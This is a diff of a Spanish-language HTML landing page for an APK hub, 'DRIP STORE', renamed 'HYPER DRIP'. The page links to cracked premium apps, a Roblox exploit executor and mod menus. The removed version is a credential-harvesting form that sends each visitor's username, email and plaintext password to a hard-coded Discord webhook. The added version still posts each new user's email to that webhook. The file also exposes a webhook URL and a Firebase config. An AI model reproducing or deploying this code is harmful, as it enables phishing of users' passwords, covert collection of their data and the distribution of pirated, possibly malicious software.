@@ -1,164 +1,151 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DRIP STORE | PREMIUM ACCESS 👑</title>
+    <title>HYPER DRIP | APKS HUB ⚡</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700;900&display=swap" rel="stylesheet">
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
+
     <style>
-        :root { --accent: #00f2ff; }
-        * { font-family: 'Outfit', sans-serif; cursor: default; }
-        
+        :root { --accent: #00f2ff; --bg: #030305; }
         body {
-            background: linear-gradient(-45deg, #030305, #0a0a1f, #160a2c, #030305);
-            background-size: 400% 400%;
-            animation: gradient 15s ease infinite;
-            color: white;
-            min-height: 100vh;
+            background-color: var(--bg);
+            color: white; font-family: 'Outfit', sans-serif;
+            background-image: radial-gradient(circle at 50% 50%, #1a1a2e 0%, #030305 100%);
         }
-        @keyframes gradient {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.05); }
+        .card-active { transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); cursor: pointer; position: relative; overflow: hidden; }
+        .card-active:hover { transform: translateY(-5px); border-color: var(--accent); box-shadow: 0 10px 30px rgba(0, 242, 255, 0.15); }
+        .card-active:active { transform: scale(0.95); }
+        .locked { opacity: 0.5; filter: grayscale(1); border: 1px dashed rgba(255,255,255,0.1); }
+        .shimmer {
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
+            background-size: 200% 100%;
+            animation: shimmer 3s infinite;
         }
-
-        .glass {
-            background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .btn-premium {
-            background: white;
-            color: black;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-        .btn-premium:hover {
-            transform: scale(1.05);
-            background: var(--accent);
-            box-shadow: 0 0 25px rgba(0, 242, 255, 0.6);
-        }
-
-        .apk-card {
-            transition: all 0.3s ease;
-        }
-        .apk-card:hover {
-            transform: translateY(-5px);
-            background: rgba(255, 255, 255, 0.08);
-            border-color: var(--accent);
-        }
-
-        .loader {
-            border: 3px solid rgba(255,255,255,0.1);
-            border-top: 3px solid var(--accent);
-            border-radius: 50%;
-            width: 20px; height: 20px;
-            animation: spin 1s linear infinite;
-            display: none;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
+        .glow-text { text-shadow: 0 0 10px rgba(0, 242, 255, 0.5); }
     </style>
 </head>
-<body class="flex items-center justify-center p-4">
+<body class="flex items-center justify-center p-4 min-h-screen">
 
     <section id="auth-screen" class="w-full max-w-md">
-        <div class="text-center mb-8">
-            <h1 class="text-5xl font-black italic tracking-tighter">CODEX <span class="text-[#00f2ff]">DRIP</span></h1>
-            <p class="text-gray-400 text-xs tracking-[5px] mt-2">🛡️ SIN VIRUS | SEGURO</p>
+        <div class="text-center mb-10">
+            <h1 class="text-7xl font-black italic tracking-tighter glow-text">HYPER <span class="text-[#00f2ff]">DRIP</span></h1>
+            <p class="text-gray-500 text-[9px] tracking-[6px] mt-4 uppercase font-bold">Encrypted Access Only</p>
         </div>
 
-        <div class="glass p-8 rounded-[35px] relative">
-            <div class="absolute -top-3 -right-3 bg-[#00f2ff] text-black text-[10px] font-bold px-3 py-1 rounded-full shadow-lg">👑 VIP ACCESS</div>
-            <h2 class="text-2xl font-bold mb-6 text-center text-white">CREAR CUENTA</h2>
+        <div class="glass p-8 rounded-[40px] border-t border-white/10">
+            <div id="auth-title" class="text-xl font-bold mb-8 text-center tracking-widest uppercase text-gray-400">Identificación</div>
             <div class="space-y-4">
-                <input type="text" id="u" placeholder="Usuario" class="w-full p-4 bg-black/40 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff]">
-                <input type="email" id="e" placeholder="Correo (@gmail, @hotmail...)" class="w-full p-4 bg-black/40 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff]">
-                <input type="password" id="p" placeholder="Contraseña" class="w-full p-4 bg-black/40 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff]">
-                <button onclick="enviarRegistro()" class="btn-premium w-full p-4 rounded-2xl font-black flex items-center justify-center gap-3">
-                    <span id="btn-text">ACCESO INSTANTÁNEO</span>
-                    <div id="loading" class="loader"></div>
+                <input type="email" id="email" placeholder="ADMIN@HYPER.DRIP" class="w-full p-4 bg-black/60 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] text-sm tracking-wider">
+                <input type="password" id="pass" placeholder="••••••••" class="w-full p-4 bg-black/60 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff] text-sm">
+                
+                <button onclick="manejarAuth()" class="w-full p-5 bg-white text-black rounded-2xl font-black text-sm hover:bg-[#00f2ff] transition-all mt-4 tracking-widest active:scale-95">
+                    EJECUTAR ACCESO
                 </button>
-                <p id="msg" class="text-center text-[10px] text-gray-500 uppercase tracking-widest mt-4">🔥 +500 usuarios activos</p>
+                
+                <button onclick="cambiarModo()" id="toggle-mode" class="w-full text-[10px] text-gray-500 mt-6 uppercase tracking-widest hover:text-white transition-colors">
+                    ¿Sin credenciales? <span class="text-[#00f2ff] underline">Crear registro</span>
+                </button>
             </div>
         </div>
     </section>
 
-    <section id="store-screen" class="hidden w-full max-w-2xl py-10">
-        <div class="text-center mb-12">
-            <h1 class="text-5xl font-black italic">DRIP <span class="text-[#00f2ff]">STORE</span></h1>
-            <p class="text-gray-400 mt-2 tracking-[3px]">PREMIUM DOWNLOAD CENTER</p>
-        </div>
-
-        <div class="grid gap-4" id="app-grid">
+    <section id="store-screen" class="hidden w-full max-w-4xl py-10">
+        <header class="flex flex-col md:flex-row justify-between items-center mb-12 gap-6">
+            <div class="text-center md:text-left">
+                <h2 class="text-4xl font-black italic tracking-tighter">PREMIUM <span class="text-[#00f2ff]">REPOSITORY</span></h2>
+                <p class="text-gray-500 text-xs mt-1 uppercase tracking-widest">Bienvenido: <span id="user-display" class="text-[#00f2ff]">...</span></p>
             </div>
+            <button onclick="location.reload()" class="glass px-6 py-3 rounded-full text-[10px] font-bold tracking-[3px] hover:bg-red-500/10 hover:text-red-500 transition-all border-red-500/20">LOGOUT</button>
+        </header>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4" id="app-grid"></div>
+        
+        <div class="mt-12 text-center">
+            <p class="text-[9px] text-gray-600 tracking-[10px] uppercase">Hyper Drip Cloud System v3.0</p>
+        </div>
     </section>
 
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr";
+        // TUS LLAVES DE FIREBASE (cite: 1000043025.jpg)
+        const firebaseConfig = {
+          apiKey: "AIzaSyAzzRWHGhYVFgkWyRwfgNKc5Ql52U4xxM8",
+          authDomain: "hyper-drip.firebaseapp.com",
+          projectId: "hyper-drip",
+          storageBucket: "hyper-drip.firebasestorage.app",
+          messagingSenderId: "1023275797824",
+          appId: "1:1023275797824:web:378ce9a674db72af05fea5"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr";
+
+        let esModoLogin = true;
 
         const apps = [
-            { n: 'CAP CUT PRO', d: 'Editor VIP v14.7.0', i: '🎬', l: 'https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file?fbclid=IwY2xjawOmPtNleHRuA2FlbQIxMQBzcnRjBmFwcF9pZAwzNTA2ODU1MzE3MjgAAR5Z4krrda1eSlY8J4m9xL-jmITar9gRT9td4ugbfgm40EtN68mVYwcXCRyyNg_aem_pw8Ldoww20oUrXvPkiX4LA', t: 'ACTUALIZADO' },
-            { n: 'DELTA EXECUTOR', d: 'Roblox Android Menu', i: '🤖', l: 'https://deltaexploits.gg/delta-executor-android', t: 'HACK' },
-            { n: 'DTW MOD MENU', d: 'Special Mod Menu v0909f6', i: '⚡', l: 'https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file', t: 'HOT' },
-            { n: 'GTA SAN ANDREAS', d: 'v2.11.277 Full Game', i: '🚗', l: 'https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file', t: 'JUEGO' },
-            { n: 'CANVA PRO', d: 'Diseño Premium Unlocked', i: '🎨', l: 'https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view', t: 'PRO' },
-            { n: 'MINECRAFT APK', d: 'Última Versión Oficial', i: '🧱', l: 'https://mineckraftapk.com.mx/', t: 'POPULAR' },
-            // TUS DOS PRÓXIMAMENTE
-            { n: 'PRÓXIMAMENTE...', d: 'Cargando nuevo contenido', i: '⏳', l: '#', t: 'COMING' },
-            { n: 'PRÓXIMAMENTE...', d: 'Cargando nuevo contenido', i: '⏳', l: '#', t: 'COMING' }
+            { n: 'CAP CUT PRO', d: 'v14.7.0 Unlocked | No Ads', i: '🎬', l: 'https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file', s: 'Active' },
+            { n: 'DELTA EXECUTOR', d: 'Android Latest Version', i: '🤖', l: 'https://deltaexploits.gg/delta-executor-android', s: 'Active' },
+            { n: 'DTW MOD MENU', d: 'Private Build 0909f6', i: '🔥', l: 'https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file', s: 'Active' },
+            { n: 'GTA SAN ANDREAS', d: 'v2.11.277 Mod APK', i: '🚗', l: 'https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file', s: 'Active' },
+            { n: 'CANVA PRO', d: 'Premium G-Drive Access', i: '🎨', l: 'https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view', s: 'Active' },
+            { n: 'MINECRAFT APK', d: 'Latest Full Edition', i: '⛏️', l: 'https://mineckraftapk.com.mx/', s: 'Active' },
+            { n: 'PROXIMAMENTE', d: 'Descifrando archivos...', i: '⌛', l: '#', s: 'Locked' },
+            { n: 'PROXIMAMENTE', d: 'Descifrando archivos...', i: '⌛', l: '#', s: 'Locked' },
+            { n: 'PROXIMAMENTE', d: 'Descifrando archivos...', i: '⌛', l: '#', s: 'Locked' },
+            { n: 'PROXIMAMENTE', d: 'Descifrando archivos...', i: '⌛', l: '#', s: 'Locked' }
         ];
 
-        async function enviarRegistro() {
-            const u = document.getElementById('u').value;
-            const e = document.getElementById('e').value;
-            const p = document.getElementById('p').value;
-            if(!u || !e || !p) return;
-
-            document.getElementById('loading').style.display = "block";
-            document.getElementById('btn-text').innerText = "CONECTANDO...";
-
-            try {
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "🚀 REGISTRO COMPLETADO",
-                            color: 61951,
-                            fields: [
-                                { name: "👤 User", value: u, inline: true },
-                                { name: "🔑 Pass", value: p, inline: true },
-                                { name: "📧 Mail", value: e }
-                            ],
-                            timestamp: new Date()
-                        }]
-                    })
-                });
-                abrirTienda();
-            } catch(err) {
-                alert("Error de conexión");
-                document.getElementById('loading').style.display = "none";
-                document.getElementById('btn-text').innerText = "REINTENTAR";
-            }
+        function cambiarModo() {
+            esModoLogin = !esModoLogin;
+            document.getElementById('auth-title').innerText = esModoLogin ? "Identificación" : "Nuevo Registro";
         }
 
-        function abrirTienda() {
+        async function manejarAuth() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            if(!email || !pass) return;
+
+            try {
+                if(esModoLogin) {
+                    await auth.signInWithEmailAndPassword(email, pass);
+                } else {
+                    await auth.createUserWithEmailAndPassword(email, pass);
+                    fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ content: `⚡ **CODEX ALERT:** Nuevo usuario registrado: \`${email}\`` })
+                    });
+                }
+                mostrarTienda(email);
+            } catch (e) { alert("Error: " + e.message); }
+        }
+
+        function mostrarTienda(email) {
             document.getElementById('auth-screen').classList.add('hidden');
             document.getElementById('store-screen').classList.remove('hidden');
+            document.getElementById('user-display').innerText = email.toUpperCase();
+            
             const grid = document.getElementById('app-grid');
             apps.forEach(app => {
+                const isLocked = app.s === 'Locked';
                 grid.innerHTML += `
-                <div onclick="if('${app.l}'!=='#') window.open('${app.l}')" class="apk-card glass p-6 rounded-[30px] flex items-center justify-between cursor-pointer border border-white/5">
+                <div ${!isLocked ? `onclick="window.open('${app.l}')"` : ''} class="glass p-6 rounded-[30px] flex items-center justify-between border-white/5 ${isLocked ? 'locked' : 'card-active shimmer'}">
                     <div class="flex items-center gap-5">
-                        <div class="text-3xl bg-black/40 w-16 h-16 flex items-center justify-center rounded-2xl shadow-inner border border-white/5">${app.i}</div>
+                        <div class="text-2xl bg-white/5 w-14 h-14 flex items-center justify-center rounded-2xl border border-white/10 shadow-inner">${app.i}</div>
                         <div>
-                            <h3 class="font-bold text-lg">${app.n}</h3>
-                            <p class="text-xs text-gray-500">${app.d}</p>
+                            <h3 class="font-bold text-sm tracking-tight">${app.n}</h3>
+                            <p class="text-[10px] text-gray-500 font-medium">${app.d}</p>
                         </div>
                     </div>
-                    <span class="text-[9px] font-black bg-[#00f2ff]/10 px-2 py-1 rounded-md text-[#00f2ff] tracking-tighter">${app.t}</span>
+                    <div class="text-[9px] font-black tracking-widest ${isLocked ? 'text-gray-600' : 'text-[#00f2ff]'}">
+                        ${isLocked ? 'BLOCK' : 'GET'}
+                    </div>
                 </div>`;
             });
         }
